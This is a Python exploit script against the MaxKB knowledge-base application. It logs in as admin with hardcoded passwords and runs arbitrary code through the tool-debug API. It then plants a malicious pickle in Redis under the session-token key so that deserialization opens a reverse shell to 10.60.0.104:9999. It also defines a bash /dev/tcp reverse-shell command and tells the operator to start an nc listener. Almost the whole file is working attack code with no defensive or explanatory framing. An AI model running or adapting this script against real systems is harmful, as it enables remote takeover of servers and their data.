import requests
import json
import sys
import os
import base64
import textwrap
import pickle
import subprocess
# Target configuration
TARGET_URL = "http://0.0.0.0:8888/"
USERNAME = "admin"
PASSWORD = "MaxKB@123.."

# API endpoints
API_BASE = f"{TARGET_URL}/admin/api"
TOOL_DEBUG_API = f"{API_BASE}/workspace/default/tool/debug"

# Session setup
session = requests.session()
session.headers.update({
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Content-Type': 'application/json',
    'Accept': 'application/json'
})


def login():
    """
    Login to MaxKB and get JWT token.
    Returns the token string on success, None on failure.
    """
    login_data = {
        "username": USERNAME,
        "password": PASSWORD,
        "captcha": ""
    }
    login_api = f"{API_BASE}/user/login"

    try:
        resp = session.post(login_api, json=login_data)
        if resp.status_code == 200:
            result = resp.json()
            if 'data' in result and result['data'] and 'token' in result['data']:
                token = result['data']['token']
                session.headers['AUTHORIZATION'] = f'Bearer {token}'
                print(f"[+] Login successful!")
                print(f"[+] JWT Token: {token[:50]}...")
                return token
            else:
                print(f"[-] Login failed: {result}")
                return None
        else:
            print(f"[-] Login request failed: {resp.status_code}")
            return None
    except Exception as e:
        print(f"[-] Login error: {e}")
        return None


def execute_python_code(code):
    """Execute Python code through tool debug endpoint"""
    payload = {
        "code": code,
        "input_field_list": [],
        "init_field_list": [],
        "init_params": {},
        "debug_field_list": []
    }

    try:
        resp = session.post(TOOL_DEBUG_API, json=payload)
        if resp.status_code == 200:
            result = resp.json()
            print(result)
            if result.get('code') != 200:
                print(f"[-] Server-side error: {result.get('message')}")
            return result.get('data', 'No data returned')
        else:
            return f"HTTP {resp.status_code}: {resp.text}"
    except Exception as e:
        return f"Exception: {e}"

class PickleRCE:
    def __init__(self, command):
        self.command = command

    def __reduce__(self):
        return (subprocess.call, (["python3","-c",'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.60.0.104",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'],))

def inject_pickle_payload(redis_host, redis_port, redis_password, token, command):
    """
    Generates a pickle payload and injects it into Redis via the RCE vulnerability.
    """
    print(f"[*] Crafting pickle payload to execute command: '{command}'")
    
    pickle_payload = pickle.dumps(PickleRCE(command))
    b64_payload = base64.b64encode(pickle_payload).decode('ascii')
    redis_key = f":TOKEN:{token}"
    print(f"[*] Target Redis key will be: {redis_key}")
    
    remote_code = f"""
def set_pickle_in_redis():
    import redis
    import base64
    
    try:
        r = redis.Redis(host={redis_host!r}, port={redis_port}, password={redis_password!r}, db=0)
        redis_key = {redis_key!r}
        b64_payload = {b64_payload!r}
        pickle_data = base64.b64decode(b64_payload)
        r.set(redis_key, pickle_data)
        return f"OK: Successfully wrote {{len(pickle_data)}} bytes of pickle data to key '{{redis_key}}'."
    except Exception as e:
        return f"Redis Error: {{e}}"

set_pickle_in_redis()
"""
    print("[*] Sending payload to remote server to inject into Redis...")
    return execute_python_code(remote_code)

def main():
    # Step 1: Login
    print("\n[+] Step 1: Authentication")
    token = login()
    if not token:
        print("[-] Exploit failed - cannot login")
        return

    print("\n[+] Step 2: Injecting Pickle Payload into Redis for RCE")
    redis_host = "localhost"
    redis_port = 6379
    redis_password = "Password123@redis"
    command_to_execute = "bash -c 'bash -i >& /dev/tcp/10.60.0.104/9999 0>&1'"

    result = inject_pickle_payload(redis_host, redis_port, redis_password, token, command_to_execute)
    print(f"[Injection Result] {result}")

    if "OK:" in str(result):
        print("\n[+] Pickle payload injected successfully!")
        print("[*] The next time the application deserializes this token from Redis,")
        print(f"[*] the command '{command_to_execute}' should be executed on the server.")
        print("[*] You may need to trigger this by making another authenticated request or simply waiting.")
        print("[*] If using a reverse shell, make sure your listener (e.g., 'nc -lvnp YOUR_PORT') is running.")
    else:
        print("\n[-] Failed to inject pickle payload.")

if __name__ == "__main__":
    main()